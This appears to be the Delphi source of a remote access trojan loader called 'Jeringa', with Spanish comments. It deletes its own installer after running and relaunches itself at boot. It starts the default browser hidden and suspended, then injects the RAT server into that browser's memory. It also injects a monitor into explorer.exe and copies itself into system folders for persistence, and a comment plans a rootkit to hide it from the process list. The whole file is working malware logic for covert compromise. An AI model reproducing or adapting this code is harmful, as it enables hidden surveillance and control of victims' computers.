program Jeringa;

uses
  Windows,
  ShellApi,
  Monitor,  //Unit que inyecta el monitor en el explorador
  Servidor,
  Funciones,
  afxCodeHook,
  Variables;

var
  PID          : dword;
  i            : integer;
  HandleWindow : THandle;
  Browser      : string;
  Instalado    : boolean;
begin
 CompartirConfig();    //compartimos la configuración
  if ParamStr(1) = '\melt' then   //Melt
  begin
    //borro el archivo de instalación, reintento 5 veces por si las moscas :)
    for i := 1 to 5 do
    begin
      if not FileExists(ParamStr(2)) then
        break
      else
        DeleteFile(Pchar(ParamStr(2)));
      Sleep(10);
    end;
    //Otra opción: while not BorrarArchivo(ParamStr(2)) do Sleep(10);
    exitprocess(0);
  end
  else
  if (paramstr(1) = '') or (paramstr(1) = 's') then   //Somos ejecutados normalmente o el pc se acaba de encender
  begin
    if(paramstr(1) = 's') then  //el PC acaba de encenderse o han matado a explorer.exe cuando la opción active setup estaba activo
      sleep(30000); //Es mejor esperar unos 30 segundos porque explorer.exe acaba de iniciarse, quizas es demasiado pero mejor prevenir...
                   //Lo malo de esto es que al esperar salimos listados en la lista de procesos, en el futuro habria que agregar un pequeño rootkit

    PID := GetProcessID('explorer.exe');
      if (PID = 0) then
      begin       //No existe explorer.exe, Muy raro....
        ShellExecute(0, 'open', PAnsiChar('explorer.exe'), PAnsiChar('explorer.exe'), nil, SW_SHOWNORMAL);
        sleep(30000);
        PID := GetProcessID('explorer.exe');
      end;
      
    if PID = 0 then exitprocess(0);

    if not Configuracion.bPersistencia then
    begin //como no está activada la persistencia yo me tengo que encargar de inyectar el rat
      ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
      StartInfo.cb      := SizeOf(TStartupInfo);
      startinfo.dwFlags := STARTF_USESHOWWINDOW; // use wShowWindow
      startinfo.wShowWindow := SW_HIDE;
      CreateProcess(pchar(GetBrowser), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      sleep(500); //le dejamos un rato...
      InjectarRAT('R', procInfo.dwProcessId);    //inyectamos el servidor en memoria, ademas se encarga de esperar a que el rat lea la configuración
      ExitProcess(0);
    end
    else
    begin
      Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%WinDir%\', FindWindowsDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%SysDir%\', FindSystemDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%TempDir%\', FindTempDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%RootDir%\', FindRootDir());
    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
      '%AppDir%\', GetSpecialFolderPath($001C));
      
      if lc(ParamStr(0)) = lc(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
      begin
        Instalado := true;
      end
      else
      begin
        Instalado := false;
      end;
      Browser := GetBrowser;
      if not fileexists(Browser) then //si no existe el archivo del navegador predeterminado salimos
        exitprocess(0);
      HandleWindow    := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
      InyectarMonitor(HandleWindow, Browser, Instalado);//Si no estamos instalados hacemos que solo nos ejecute una vez
      ExitProcess(0);
    end;
    
  end
  else  //Monitor nos indica que tenemos que inyectar el rat
  if (paramstr(1) = 'INJECT') then 
  begin
     PID := GetProcessID(extractfilename(GetBrowser));
     InjectarRAT('R', PID); //Se encarga de esperar a que finalice de leer la config
     ExitProcess(0);
  end;

end.
